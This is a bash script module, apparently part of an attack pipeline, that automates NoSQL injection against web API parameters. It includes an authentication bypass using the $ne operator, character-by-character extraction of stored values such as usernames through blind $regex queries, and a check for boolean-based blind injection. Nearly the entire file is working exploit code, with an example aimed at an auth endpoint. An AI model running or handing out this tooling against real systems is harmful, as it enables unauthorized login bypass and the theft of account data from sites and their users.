#!/bin/bash
# nosqli-enum.sh - NoSQL injection enumeration and exploitation
# Source from pipeline.sh: source ./nosqli-enum.sh
#
# Functions:
#   nosqli_enumerate <base_url> <endpoint> <param>
#   nosqli_blind <base_url> <endpoint> <param>

nosqli_enumerate() {
    local base="$1"
    local endpoint="$2"
    local param="$3"

    if [ -z "$base" ] || [ -z "$endpoint" ] || [ -z "$param" ]; then
        log "  [-] Usage: nosqli_enumerate <base_url> <endpoint> <param>"
        log "  [-] Example: nosqli_enumerate http://target /api/v2/auth/inquire username"
        return 1
    fi

    log "  [*] NoSQL enumeration on $endpoint with param '$param'"

    # Test with $ne (not equal) to bypass auth or enumerate
    local test_url="$base$endpoint?${param}[\$ne]="
    local body=$(curl -sk "$test_url" 2>/dev/null)
    echo "$body" | grep -qiE "user|success|token|welcome" && log "  [+] NoSQLi \$ne bypass works on '$param'" || log "  [-] NoSQLi \$ne bypass failed on '$param'"

    # Try $regex for blind enumeration
    local chars="abcdefghijklmnopqrstuvwxyz0123456789_-"
    local known=""
    local found=1

    while [ "$found" = "1" ]; do
        found=0
        for ((i=0; i<${#chars}; i++)); do
            local c="${chars:$i:1}"
            local regex_url="$base$endpoint?${param}[\$regex]=^${known}${c}.*"
            local resp=$(curl -sk -o /dev/null -w "%{http_code}" "$regex_url" 2>/dev/null)
            if [ "$resp" = "200" ]; then
                known="${known}${c}"
                log "  [+] Found: $known"
                found=1
                break
            fi
        done
    done

    [ -n "$known" ] && log "  [+] Enumerated value: $known"
}

nosqli_blind() {
    local base="$1"
    local endpoint="$2"
    local param="$3"

    # Test NoSQL injection with boolean-based blind
    local true_test=$(curl -sk -o /dev/null -w "%{http_code}" "$base$endpoint?${param}[\$ne]=test" 2>/dev/null)
    local false_test=$(curl -sk -o /dev/null -w "%{http_code}" "$base$endpoint?${param}=nonexistent_value_thatequalsnothing" 2>/dev/null)

    log "  [*] Blind NoSQLi: true=$true_test false=$false_test"
    [ "$true_test" != "$false_test" ] && log "  [+] Blind NoSQLi confirmed!"
}
